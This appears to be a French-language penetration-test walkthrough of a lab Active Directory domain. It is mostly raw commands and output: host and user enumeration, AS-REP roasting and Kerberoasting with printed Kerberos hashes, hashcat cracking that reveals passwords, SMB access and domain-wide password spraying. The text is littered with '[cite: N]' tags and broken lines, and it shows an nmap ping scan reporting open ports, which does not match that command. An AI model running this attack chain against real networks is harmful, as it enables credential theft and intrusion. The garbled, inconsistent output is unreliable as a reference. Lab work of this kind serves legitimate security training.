### 1. Scan Nmap

```text
nmap -sn 10.13.37.0/24 --exclude 10.13.37.1 [cite: 1]

Nmap scan report for 10.13.37.10 [cite: 1]
Host is up (0.020s latency). [cite: 1]
Not shown: 6 closed tcp ports (conn-refused) [cite: 2]
PORT     STATE SERVICE [cite: 2]
135/tcp  open  msrpc [cite: 2]
139/tcp  open  netbios-ssn [cite: 2]
445/tcp  open  microsoft-ds [cite: 2]
3389/tcp open  ms-wbt-server [cite: 2]
5985/tcp open  wsman [cite: 2]

Nmap scan report for 10.13.37.20 [cite: 2]
Host is up (0.029s latency). [cite: 2]
Not shown: 6 closed tcp ports (conn-refused) [cite: 3]
PORT     STATE SERVICE [cite: 3]
135/tcp  open  msrpc [cite: 3]
139/tcp  open  netbios-ssn [cite: 3]
445/tcp  open  microsoft-ds [cite: 3]
3389/tcp open  ms-wbt-server [cite: 3]
5985/tcp open  wsman [cite: 3]

Nmap scan report for 10.13.37.30 [cite: 3]
Host is up (0.029s latency). [cite: 3]
Not shown: 6 closed tcp ports (conn-refused) [cite: 4]
PORT     STATE SERVICE [cite: 4]
135/tcp  open  msrpc [cite: 4]
139/tcp  open  netbios-ssn [cite: 4]
445/tcp  open  microsoft-ds [cite: 4]
3389/tcp open  ms-wbt-server [cite: 4]
5985/tcp open  wsman [cite: 4]

Nmap scan report for 10.13.37.44 [cite: 4]
Host is up (0.024s latency). [cite: 4]
Not shown: 6 closed tcp ports (conn-refused) [cite: 5]
PORT     STATE SERVICE [cite: 5]
135/tcp  open  msrpc [cite: 5]
139/tcp  open  netbios-ssn [cite: 5]
445/tcp  open  microsoft-ds [cite: 5]
3389/tcp open  ms-wbt-server [cite: 5]
5985/tcp open  wsman [cite: 5]

Nmap scan report for 10.13.37.101 [cite: 5]
Host is up (0.021s latency). [cite: 5]
Not shown: 6 closed tcp ports (conn-refused) [cite: 6]
PORT     STATE SERVICE [cite: 6]
135/tcp  open  msrpc [cite: 6]
139/tcp  open  netbios-ssn [cite: 6]
445/tcp  open  microsoft-ds [cite: 6]
3389/tcp open  ms-wbt-server [cite: 6]
5985/tcp open  wsman [cite: 6]

Nmap scan report for 10.13.37.111 [cite: 6]
Host is up (0.026s latency). [cite: 6]
Not shown: 6 closed tcp ports (conn-refused) [cite: 7]
PORT     STATE SERVICE [cite: 7]
135/tcp  open  msrpc [cite: 7]
139/tcp  open  netbios-ssn [cite: 7]
445/tcp  open  microsoft-ds [cite: 7]
3389/tcp open  ms-wbt-server [cite: 7]
5985/tcp open  wsman [cite: 7]

Nmap scan report for 10.13.37.123 [cite: 7]
Host is up (0.026s latency). [cite: 7]
Not shown: 6 closed tcp ports (conn-refused) [cite: 8]
PORT     STATE SERVICE [cite: 8]
135/tcp  open  msrpc [cite: 8]
139/tcp  open  netbios-ssn [cite: 8]
445/tcp  open  microsoft-ds [cite: 8]
3389/tcp open  ms-wbt-server [cite: 8]
5985/tcp open  wsman [cite: 8]

Nmap scan report for 10.13.37.124 [cite: 8]
Host is up (0.023s latency). [cite: 8]
Not shown: 6 closed tcp ports (conn-refused) [cite: 9]
PORT     STATE SERVICE [cite: 9]
135/tcp  open  msrpc [cite: 9]
139/tcp  open  netbios-ssn [cite: 9]
445/tcp  open  microsoft-ds [cite: 9]
3389/tcp open  ms-wbt-server [cite: 9]
5985/tcp open  wsman [cite: 9]

Nmap scan report for 10.13.37.132 [cite: 9]
Host is up (0.023s latency). [cite: 9]
Not shown: 6 closed tcp ports (conn-refused) [cite: 10]
PORT     STATE SERVICE [cite: 10]
135/tcp  open  msrpc [cite: 10]
139/tcp  open  netbios-ssn [cite: 10]
445/tcp  open  microsoft-ds [cite: 10]
3389/tcp open  ms-wbt-server [cite: 10]
5985/tcp open  wsman [cite: 10]

Nmap scan report for 10.13.37.137 [cite: 10]
Host is up (0.024s latency). [cite: 10]
Not shown: 6 closed tcp ports (conn-refused) [cite: 11]
PORT     STATE SERVICE [cite: 11]
135/tcp  open  msrpc [cite: 11]
139/tcp  open  netbios-ssn [cite: 11]
445/tcp  open  microsoft-ds [cite: 11]
3389/tcp open  ms-wbt-server [cite: 11]
5985/tcp open  wsman [cite: 11]

Nmap scan report for 10.13.37.155 [cite: 11]
Host is up (0.024s latency). [cite: 11]
Not shown: 6 closed tcp ports (conn-refused) [cite: 12]
PORT     STATE SERVICE [cite: 12]
135/tcp  open  msrpc [cite: 12]
139/tcp  open  netbios-ssn [cite: 12]
445/tcp  open  microsoft-ds [cite: 12]
3389/tcp open  ms-wbt-server [cite: 12]
5985/tcp open  wsman [cite: 12]

Nmap scan report for 10.13.37.202 [cite: 12]
Host is up (0.022s latency). [cite: 12]
Not shown: 6 closed tcp ports (conn-refused) [cite: 13]
PORT     STATE SERVICE [cite: 13]
135/tcp  open  msrpc [cite: 13]
139/tcp  open  netbios-ssn [cite: 13]
445/tcp  open  microsoft-ds [cite: 13]
3389/tcp open  ms-wbt-server [cite: 13]
5985/tcp open  wsman [cite: 13]

Nmap scan report for 10.13.37.222 [cite: 13]
Host is up (0.023s latency). [cite: 13]
Not shown: 6 closed tcp ports (conn-refused) [cite: 14]
PORT     STATE SERVICE [cite: 14]
135/tcp  open  msrpc [cite: 14]
139/tcp  open  netbios-ssn [cite: 14]
445/tcp  open  microsoft-ds [cite: 14]
3389/tcp open  ms-wbt-server [cite: 14]
5985/tcp open  wsman [cite: 14]

Nmap scan report for 10.13.37.234 [cite: 14]
Host is up (0.020s latency). [cite: 14]
Not shown: 6 closed tcp ports (conn-refused) [cite: 15]
PORT     STATE SERVICE [cite: 15]
135/tcp  open  msrpc [cite: 15]
139/tcp  open  netbios-ssn [cite: 15]
445/tcp  open  microsoft-ds [cite: 15]
3389/tcp open  ms-wbt-server [cite: 15]
5985/tcp open  wsman [cite: 15]

```

---

### 2. Accès initial et récupération des utilisateurs (GetADUsers)

```text
netexec smb 10.13.37.10 -u pentester -p 'Password123!' [cite: 15]
SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 16]
SMB         10.13.37.10     445    WK-010           [+] celestina.shop\pentester:Password123! [cite: 16]
impacket-GetADUsers -all celestina.shop/pentester:'Password123!' -dc-ip 10.13.37.42 [cite: 17]

[*] Querying 10.13.37.42 for information about domain. [cite: 17]
Name                  Email                           PasswordLastSet      LastLogon            [cite: 18]
--------------------  ------------------------------  -------------------  ------------------- [cite: 18]
Administrator                                         2025-03-20 13:44:35.311754  2025-03-20 15:11:44.034582 [cite: 18, 19]
Guest                                                 <never>              <never>              [cite: 19]
krbtgt                                                2024-07-08 14:34:54.855736  <never>              [cite: 19, 20]
pentester                                             2024-08-21 14:41:47.240706  2026-05-18 09:16:06.198378 [cite: 20, 21]
j.vabre                                               2024-07-08 14:58:10.541265  2026-05-18 09:35:53.108865 [cite: 21]
g.clooney                                             2024-07-12 11:27:52.438146  2025-03-18 09:49:07.078090 [cite: 21, 22]
j.smith                                               2024-07-12 14:41:30.942163  <never>              [cite: 22]
s.smith                                               2024-07-12 14:41:31.020319  <never>              [cite: 22, 23]
s.khan                                                2024-07-12 14:41:31.051794  <never>              [cite: 23]
m.smith                                               2024-07-12 14:41:31.084251  <never>              [cite: 23, 24]
s.kumar                                               2024-07-12 14:41:31.125204  <never>              [cite: 24, 25]
c.smith                                               2024-07-12 14:41:31.152666  <never>              [cite: 25]
a.smith                                               2024-07-12 14:41:31.193398  <never>              [cite: 25, 26]
j.johnson                                             2024-07-12 14:41:31.225103  <never>              [cite: 26]
d.smith                                               2024-07-12 14:41:31.287635  <never>              [cite: 27]
a.khan                                                2024-07-12 14:41:31.319073  <never>              [cite: 27, 28]
k.smith                                               2024-07-12 14:41:31.350896  <never>              [cite: 28]
a.kumar                                               2024-07-12 14:41:31.383105  <never>              [cite: 28, 29]
j.williams                                            2025-03-19 14:35:30.148916  <never>              [cite: 29, 30]
j.jones                                               2024-07-12 14:41:31.448186  <never>              [cite: 30]
j.lee                                                 2024-07-12 14:41:31.481191  <never>              [cite: 30, 31]
j.brown                                               2024-07-12 14:41:31.513601  <never>              [cite: 31, 32]
s.singh                                               2024-07-12 14:41:31.546501  <never>              [cite: 32]
t.smith                                               2024-07-12 14:41:31.587287  <never>              [cite: 32, 33]
b.smith                                               2024-07-12 14:41:31.618878  <never>              [cite: 33]
r.smith                                               2024-07-12 14:41:31.650521  <never>              [cite: 34]
m.johnson                                             2024-07-12 14:41:31.682311  <never>              [cite: 34, 35]
a.singh                                               2024-07-12 14:41:31.715311  <never>              [cite: 35]
s.johnson                                             2024-07-12 14:41:31.748054  <never>              [cite: 35, 36]
l.smith                                               2024-07-12 14:41:31.781147  <never>              [cite: 36, 37]
c.johnson                                             2024-07-12 14:41:31.813656  <never>              [cite: 37]
d.johnson                                             2024-07-12 14:41:31.846233  <never>              [cite: 37, 38]
s.jones                                               2024-07-12 14:41:31.879872  <never>              [cite: 38]
a.johnson                                             2024-07-12 14:41:31.912184  <never>              [cite: 38, 39]
m.jones                                               2025-03-19 14:33:50.480956  2026-05-18 09:35:31.938818 [cite: 39, 40]
s.williams                                            2024-07-12 14:41:31.981450  <never>              [cite: 40]
a.sharma                                              2024-07-12 14:41:32.013199  <never>              [cite: 40, 41]
j.miller                                              2024-07-12 14:41:32.044579  <never>              [cite: 41]
s.sharma                                              2024-07-12 14:41:32.075904  <never>              [cite: 41, 42]
a.ali                                                 2024-07-12 14:41:32.106986  <never>              [cite: 42, 43]
c.jones                                               2024-07-12 14:41:32.143227  <never>              [cite: 43]
c.williams                                            2024-07-12 14:41:32.177166  <never>              [cite: 43, 44]
c.brown                                               2024-07-12 14:41:32.216970  <never>              [cite: 44]
m.williams                                            2024-07-12 14:41:32.248594  <never>              [cite: 45]
r.kumar                                               2024-07-12 14:41:32.280071  <never>              [cite: 45, 46]
d.williams                                            2024-07-12 14:41:32.311494  <never>              [cite: 46]
s.brown                                               2024-07-12 14:41:32.345202  <never>              [cite: 46, 47]
m.brown                                               2024-07-12 14:41:32.378620  <never>              [cite: 47, 48]
a.jones                                               2024-07-12 14:41:32.413483  <never>              [cite: 48]
d.jones                                               2024-07-12 14:41:32.452919  <never>              [cite: 48, 49]
s.ahmed                                               2024-07-12 14:41:32.484200  <never>              [cite: 49]
j.davis                                               2024-07-12 14:41:32.516097  <never>              [cite: 50]
a.williams                                            2024-07-12 14:41:32.548532  <never>              [cite: 50, 51]
k.johnson                                             2024-07-12 14:41:32.580954  <never>              [cite: 51]
t.johnson                                             2024-07-12 14:41:32.613380  <never>              [cite: 51, 52]
s.lee                                                 2024-07-12 14:41:32.646012  <never>              [cite: 52, 53]
s.ali                                                 2025-03-19 14:35:46.737896  <never>              [cite: 53]
r.singh                                               2024-07-12 14:41:32.713179  <never>              [cite: 53, 54]
d.brown                                               2024-07-12 14:41:32.751784  <never>              [cite: 54]
a.brown                                               2024-07-12 14:41:32.783148  <never>              [cite: 55]
j.taylor                                              2024-07-12 14:41:32.814601  <never>              [cite: 55, 56]
j.garcia                                              2024-07-12 14:41:32.864262  <never>              [cite: 56]
b.johnson                                             2024-07-12 14:41:32.898150  <never>              [cite: 56, 57]
j.wilson                                              2024-07-12 14:41:32.930944  <never>              [cite: 57, 58]
m.ali                                                 2024-07-12 14:41:32.964521  <never>              [cite: 58]
t.jones                                               2024-07-12 14:41:33.003041  <never>              [cite: 58, 59]
t.williams                                            2024-07-12 14:41:33.034804  <never>              [cite: 59]
k.jones                                               2024-07-12 14:41:33.066172  <never>              [cite: 60]
j.anderson                                            2025-03-19 14:34:43.877609  <never>              [cite: 60, 61]
k.williams                                            2024-07-12 14:41:33.129006  <never>              [cite: 61]
j.thomas                                              2024-07-12 14:41:33.166115  <never>              [cite: 61, 62]
j.rodriguez                                           2024-08-23 15:52:13.996458  <never>              [cite: 62]
a.lee                                                 2024-07-12 14:41:33.239298  <never>              [cite: 63]
k.brown                                               2025-03-19 14:35:00.059308  <never>              [cite: 63, 64]
p.kumar                                               2024-07-12 14:41:33.302592  <never>              [cite: 64]
j.martin                                              2024-07-12 14:41:33.333412  <never>              [cite: 65]
r.johnson                                             2024-07-12 14:41:33.365788  <never>              [cite: 65, 66]
t.brown                                               2024-07-12 14:41:33.398174  <never>              [cite: 66]
m.khan                                                2024-07-12 14:41:33.430399  <never>              [cite: 66, 67]
d.folt                                                2024-07-12 17:19:50.432235  2025-03-18 09:58:09.430456 [cite: 67, 68]
a.nozer                                               2024-07-15 10:27:19.583960  2025-03-19 10:58:12.767212 [cite: 68]
d.scrip                                               2024-07-18 10:22:45.444879  2025-03-18 13:29:59.352281 [cite: 68, 69]
a.lttp                                                2024-07-20 00:05:21.505617  2026-05-18 09:36:22.993810 [cite: 69]
k.udele                                               2024-07-22 15:49:23.495074  2026-05-18 09:36:18.928201 [cite: 69, 70]
s.kuwel                                               2024-07-23 14:58:09.897895  2024-09-20 18:12:15.128808 [cite: 70]
d.toh                                                 2025-03-18 13:27:19.177750  2025-03-18 13:27:28.075306 [cite: 70, 71]
p.origan                                              2024-08-13 23:57:28.333277  2025-03-18 11:19:31.323063 [cite: 71]
k.cheh                                                2025-03-17 18:09:05.876643  2025-03-17 18:09:24.189139 [cite: 71, 72]
k.cedepte                                             2025-03-20 14:13:23.907628  2025-03-20 15:59:58.336117 [cite: 72]

```

---

### 3. Attaque AS-REP Roasting et Cassage de Hash (Hashcat)

```text
❯ impacket-GetNPUsers celestina.shop/pentester:'Password123!' -dc-ip 10.13.37.42 -request -format hashcat [cite: 72, 73]
Impacket v0.14.0.dev0+20260116.125256.a0bc463b - Copyright Fortra, LLC and its affiliated companies [cite: 73]

Name     MemberOf  PasswordLastSet             LastLogon                   UAC      [cite: 73]
-------  --------  --------------------------  --------------------------  -------- [cite: 73]
j.vabre            2024-07-08 14:58:10.541265  2026-05-18 09:47:07.936086  0x410200 [cite: 73]



$krb5asrep$23$j.vabre@CELESTINA.SHOP:626da1d3d18e09c7d37bfd50d6939886$9835288e7e055f8c13bdbfac2d876a4e1bb8677107c6fb343c5806877f52f7e6224103123ed656c8fc3c23687d4ff2b0d1be5feaab884958966b4a50fc6762b6c415e58911284bcd825da46a90d71c4d6e622d93aacfae41f79e488052b47e7becbd6adfe7ba59650930d718669bdae63daa16ba91ec62165fd5db0edfe7083f4a1df89ee91aca3e56a66586089b89c0dfdd7d24c478aafd3c867f057eb43b22e1f738a12cff73b8e78209e172496fb2b844a2cf81c7cd712e9a43d6c39d9f5bfa8285b6c11d235e188372cb198613edf5c254f36593deab5a443fd6b33ce4b1925ab8ca456f7415012d9a208b913f3e [cite: 73]


❯   hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force [cite: 73]
hashcat (v6.2.6) starting [cite: 73]

You have enabled --force  [cite: 73]
to bypass dangerous warnings and errors! [cite: 74]
This can hide serious problems and should only be done when debugging. [cite: 75]
Do not report hashcat issues encountered when using --force. [cite: 75]

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] [cite: 75]
================================================================================================================================================== [cite: 75]
* Device #1: pthread-haswell-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 6876/13817 MB (2048 MB allocatable), 12MCU [cite: 75]

Minimum password length supported by kernel: 0 [cite: 75]
Maximum password length supported by kernel: 256 [cite: 75]

INFO: All hashes found as potfile and/or empty entries! [cite: 75]
Use --show to display them. [cite: 76]

Started: Mon May 18 09:49:20 2026 [cite: 76]
Stopped: Mon May 18 09:49:20 2026 [cite: 76]
❯ ls [cite: 76]
asrep_cracked.txt  asrep_hashes.txt  Groups.xml  hosts_1.txt  hosts_2.txt  notice.pdf  ports_key.txt  users.txt [cite: 76]
❯ cat asrep_cracked.txt [cite: 76]
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── [cite: 76]
       │ File: asrep_cracked.txt [cite: 76]
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── [cite: 76]
   1   │ $krb5asrep$23$j.vabre@CELESTINA.SHOP:208cb5ff41a229b802369b7083f150ae$9d002e3faaf7c403292d7decdd42496fd0014ec58af33d8cfd60162af1d479c4351fad4998e20ef1da9635a966e1f136c5feb7439667be2 [cite: 76]
       │ 8687b0192ded112d3b6ee1bc04deb35a74ce34957356b5d416e8f5ad7bec5e77d7d06dd7bb12944e2a084fb38fdf70eccb99a2ed483cf70bda7e267f086ecea892d7118b63112d8d903fc063de7159ad544187f5442598e68166c [cite: 76]
       │ 6aaa0a06e949ee2f025cdde5fd56cd113906f129d08d4df199ea6b1f9ec3d17eed91e4be380233ca27df765f7f1da045769efe21b12a889e303c4d64c00d8d0e937ace33cb6fb40bd04a8d3589b3f55480b5a4f5ace6d4e19da94 [cite: 76]
       │ 8b1af7d:Coffee4me! [cite: 76]
───────┴────────────────────────────────────── [cite: 77]

```

---

### 4. Accès SMB et Spraying Netexec

```text
❯ smbclient //10.13.37.42/HUB -U 'celestina.shop\j.vabre%Coffee4me!' [cite: 77]
Try "help" to get a list of possible commands. [cite: 77]
smb: \> dir [cite: 77]
  . [cite: 77]
D        0  Wed Mar 19 14:06:23 2025 [cite: 78]
  ..                                DHS        0  Mon May 26 16:34:22 2025 [cite: 78]
  notice.pdf                          A    34224  Fri Sep 20 17:34:54  [cite: 78]
2024 [cite: 79]

		16687103 blocks of size 4096. 13686625 blocks available [cite: 79]



❯ netexec smb 10.13.37.0/24 -u j.vabre -p Coffee4me! [cite: 79]
SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 80]
SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 80]
SMB         10.13.37.44     445    WK-044         [cite: 80]
   [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 81]
SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 81]
SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:False) [cite: 81]
SMB         10.13.37.20     445    [cite: 81]
 WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 82]
SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 82]
SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 82]
SMB     [cite: 82]
     10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 83]
SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 83]
SMB         10.13.37.101    445    WK-101           [*] Windows  [cite: 83]
11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 84]
SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 84]
SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 84]
SMB         10.13.37.202    445    WK-202   [cite: 84]
          [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 85]
SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:False) [cite: 85]
SMB         10.13.37.111    445    WK-111           [+] celestina.shop\j.vabre:Coffee4me! [cite: 85]
SMB         10.13.37.132    445    WK-132           [+] celestina.shop\j.vabre:Coffee4me! [cite: 86]
SMB         10.13.37.44     445    WK-044           [+] celestina.shop\j.vabre:Coffee4me! [cite: 87]
SMB         10.13.37.10     445    WK-010           [+] celestina.shop\j.vabre:Coffee4me! [cite: 88]
SMB         10.13.37.42     445    DC-CELESTINA     [+] celestina.shop\j.vabre:Coffee4me! [cite: 89]
SMB         10.13.37.20     445    WK-020           [+] celestina.shop\j.vabre:Coffee4me! [cite: 90]
SMB         10.13.37.30     445    WK-030           [+] celestina.shop\j.vabre:Coffee4me! [cite: 91]
SMB         10.13.37.155    445    WK-155           [+] celestina.shop\j.vabre:Coffee4me! [cite: 92]
SMB         10.13.37.124    445    WK-124           [+] celestina.shop\j.vabre:Coffee4me! [cite: 93]
SMB         10.13.37.222    445    WK-222           [+] celestina.shop\j.vabre:Coffee4me! [cite: 94]
SMB         10.13.37.101    445    WK-101           [+] celestina.shop\j.vabre:Coffee4me! [cite: 95]
SMB         10.13.37.123    445    WK-123           [+] celestina.shop\j.vabre:Coffee4me! [cite: 96]
SMB         10.13.37.137    445    WK-137           [+] celestina.shop\j.vabre:Coffee4me! [cite: 97]
SMB         10.13.37.202    445    WK-202           [+] celestina.shop\j.vabre:Coffee4me! [cite: 98]
SMB         10.13.37.234    445    WK-234           [+] celestina.shop\j.vabre:Coffee4me! [cite: 99]

```

---

### 5. Énumération des SPN, Kerberoasting et Cassage de TGS

```text
❯ impacket-GetUserSPNs celestina.shop/j.vabre:'Coffee4me!' -dc-ip 10.13.37.42 [cite: 100]
Impacket v0.14.0.dev0+20260116.125256.a0bc463b - Copyright Fortra, LLC and its affiliated companies [cite: 100]

ServicePrincipalName           Name       MemberOf  PasswordLastSet             LastLogon                   Delegation   [cite: 100]
-----------------------------  ---------  --------  --------------------------  --------------------------  ----------- [cite: 100]
HTTP/g.clooney.celestina.shop  g.clooney            2024-07-12 11:27:52.438146  2025-03-18 09:49:07.078090     [cite: 100]
           [cite: 101]
HTTP/I_NEED_A_SPN              k.cedepte            2025-03-20 14:13:23.907628  2025-03-20 15:59:58.336117  constrained  [cite: 101]


❯ impacket-GetUserSPNs celestina.shop/j.vabre:'Coffee4me!' [cite: 101]
-dc-ip 10.13.37.42 -request [cite: 102]
Impacket v0.14.0.dev0+20260116.125256.a0bc463b - Copyright Fortra, LLC and its affiliated companies [cite: 102]

ServicePrincipalName           Name       MemberOf  PasswordLastSet             LastLogon                   Delegation   [cite: 102]
-----------------------------  ---------  --------  --------------------------  --------------------------  ----------- [cite: 102]
HTTP/g.clooney.celestina.shop  g.clooney            2024-07-12 11:27:52.438146  2026-05-18 10:10:19.212873       [cite: 102]
          [cite: 103]
HTTP/I_NEED_A_SPN              k.cedepte            2025-03-20 14:13:23.907628  2026-05-18 10:10:19.781707  constrained  [cite: 103]



[-] CCache file is not found. [cite: 103]
Skipping... [cite: 104]
$krb5tgs$23$*g.clooney$CELESTINA.SHOP$celestina.shop/g.clooney*$8d65ced44fa9c8fd9b81c61c221511f3$eeee18237ee7d441954cada99d42c200e1903d9b637048b974c80484c38f4658d5f565c978f738222c2cac2eeaf0d08e458cc238a017a1e2b9f5f27564feaee82e8b6637cb6920f4c47239f43c48d3a9be714a1e37eb2366a5dc92951d0028c9c6dfd8ea4bfbaeaf25b9e80b0c72dd008899a501754d79dc1c2e6f68e2b647d437794bb95bb64f967f0a1d06d0746907719d7bd4a25028570a383e394a0c10a83b9aa5f028f7915b928431e3623ad7e79f9e53e8a696ec7d9cb7e4c578bd499fbb182bba4a6bd4847ab570018bd2f950ce527d72788f39d0f1b01d900eae5959f0216dbac1d3cb782ed4e66ea58010bf55b7cdc9c55663c93d20f59d1a1ff85aed2d3d6b478a6c13f4090c1c75b464e2eb3ced7f4e1a5826e69915b90ea80d372909965f42b2dafe29d623f82987e315e1e64cf65933dba40b89a815b57c0611b00937bc268db8ff48d851ce876f9086f4dd639a062a7f4def558f871d54963e2acf39687750da0deb6dd707892edc06e6c1e2fd08d6648baa15eeb0171643569daa62da83cbb422c4274bd8c84a6aa22421fc674a3013bf2207bd96806942a88fca7000b2e7229934bf0f5b4ee50445c3e590578ff9dde79876714d0d705656492e462ffa05d114f456126c6af0fdff9b119df45a19d6f07182b59412ee386603116d68a176aa2143950f098255b0bcfca27913cc5d2e3e0806618d2fd60d87519b47a62f962249621555d8d5af70d295ae3f07f47c4a42b7b00cf4213a9a3178d6ecce8c9abd1559ce26c5a7f7d72f5f710a70b4ebb84b2fd1d04c4b720e64f600796cf530194ea63a3007c5dba2c41405fdb0d7cf5d791581da16f9b391d5407866641d9fdc773ed86fa3744df707d6b61a8e385dd5246bbc54823f304b767c4000e86669514f105dc383a35f1d646d1d93f1bf367003463fd4033f1cd3bba610f8d0c68ec6ca883955e7be77d693573704f7e7f9757b86133b8b71e02aca6e12b833ad4f1cf007af476d867e94da7efe843b6b571e2ebd56a2241b63e5a13457b298e9ccd069c6de11bde631aaa6dc82ad379740040913731a3851c29559b5ccee2f945657dbe418b8a1a143168d74c032aeb4d37bb55302a62f82cb51a7b7e91da05a45ff0e3f692a46dbfa80d64e1289a4d498e999b00e0222201580dcf989d8829ad4ef49ecc1e89dfc2c0cb3ae5d0a9a3d5b1f35b9599f1484a099bf352e37fc9410ed2b69b14b53b15f893559d07ba70986612b471281a4eb63587568f0ca7feceaf45ff189b5c9e0e9e10fe7b524083354aed30f1e830063cf9412e85e6f468b5af60340a253caede430c9838f67e69e1fa6e185dcce94af5dd82c0671b7f4551ee07e172f0fd2573629e11eb3921a65580d7d40883ad230db85abdba1517d16fa8fa907ab32f0d8ee2887786a855df0e357c298b1cddcadd9430584b373805a43 [cite: 104]
$krb5tgs$23$*k.cedepte$CELESTINA.SHOP$celestina.shop/k.cedepte*$c27bba6f40e76053ad21909e44debe2f$bd20e94314a05b46234c94488e46fba2da4adb269e4bd08cf8bd34b1465caaee05bce288ce06dae758df29be4bd9a471e2adab3e9ad64b76c7fc125de0c2e1c4390afa8472881218b0a8983149e93c9d20062230e7b13761e3f75fe602d976d7b24fc191e74a2052082bd8fcb892f16baffa73cfae2a9196e930b4d60c69f3deae49cf04a799e6c31468da782a18bb8685d3d3232a391d0d5f096557851f499f2552a2f7546c1acd6c6b40ebd9a6631abb75d0d5343aa38705bb25d0546303be1e2e096f55c9617f63c67d9b66947f91e14745bd1f348cccc9e392b94fe4c89d99ce014d761d17fa4299da89609e8144ccbd6c6d2c1b61814f668e377c683050ce4c2916f107aec73247cd7be89d5d9be8ef9eb95a366a90844d909467ec9cdca5b19cc3e52445f2e6c27e03e95e52864d270a90afeefb06f707a388078f5bf38dd39eb3e55c0d7478f541c1f9848bb53e97fec61145c5082a1fed4e3f1efb54c2841da79e46271548c657740ced822fc461faae4e39cf30a5457480da86be61c160eff204572c4be8cf4dbf73ac16f6c341246b7f840e9ad0012e0a2e2bc415e9815a6b1e06055d34fd6d0d584adbea930709bcc6ba5f7a69dd1ff241cc77ebf3d3d8facad4b0571f2cf84095fc65d1dcf489872a7da1580aa3dfde90f53fb57d82510c11af96d9c15533773c9ca288880644f5f864f5cd34a66de4247b4ec9282a769742b685ad5ff8ef85e3d26d10b9902c913fb976cc039a93f328b19de4115b95a972e09b1fafd444cc8ad2c2a55eeff002a04f1441830f0b8e85ba8244523fa505d8eb4707a60d7b2b3e5f55e59ac13997df28453e7f4f7e335db44491098d7903f71c7a8541869a95b016474de7874f4677152004c27e27b98cb4c10d4908ca97dc0fbc48447744f676c89023fe9cc929b309e5fe6624d9566d4b6778a9350367e676459bbbd6c6839cd4f500781847202fde5ff74347fe1ebc265d935e0bbcd4c4223fc44d3b3d0ef377e97b1a7a09003fef4368a1b320f974623b5a4fa285f152a3a9e460ea7c1ff7a18fb1ad3557716379e6b174e6c2785789df8a2acca8dd57228ba3bef039bd6a20f768289a3bdec5f3e364b30fd5330f349128e4e2b92e96c9e13f9dcade7932b766e25786761c459157ae7b5a1e182259bd5bed5ce67c7daa39afb2a32ad9d8e1a4a97047ddc2eb60b88734b0426192832aed2fce0fbddf845b651352d1a576fc302d8b65a97f214d0814f6923c1d879eae5e483b2b85a783d36b218d0e60c8c98198f82aa2998b0eb7734f0fd0ca147edb078b8a016cb4c0038564ced56b45286d6bbda92833699e1107fb587627438f548be4e25998de960137b5937f4cc78d5ff3b6e0b971310672ea1ebfde30681bcf26c04341c1543fe982465450d341a1671748256a2e04bef925dd223e3cbb04dc5fdaad9a76d73f [cite: 104]


❯  hashcat -m 13100 gclooney.hash /usr/share/wordlists/rockyou.txt --force [cite: 104]
hashcat (v6.2.6) starting [cite: 104]

You have enabled --force to bypass dangerous warnings and errors! [cite: 104]
This can hide serious problems and should only be done when debugging. [cite: 105]
Do not report hashcat issues encountered when using --force. [cite: 106]

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] [cite: 106]
================================================================================================================================================== [cite: 106]
* Device #1: pthread-haswell-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 6876/13817 MB (2048 MB allocatable), 12MCU [cite: 106]

Minimum password length supported by kernel: 0 [cite: 106]
Maximum password length supported by kernel: 256 [cite: 106]

INFO: All hashes found as potfile and/or empty entries! [cite: 106]
Use --show to display them. [cite: 107]

Started: Mon May 18 10:12:29 2026 [cite: 107]
Stopped: Mon May 18 10:12:29 2026 [cite: 107]

-> CoffeeMug!1 [cite: 107]

```

---

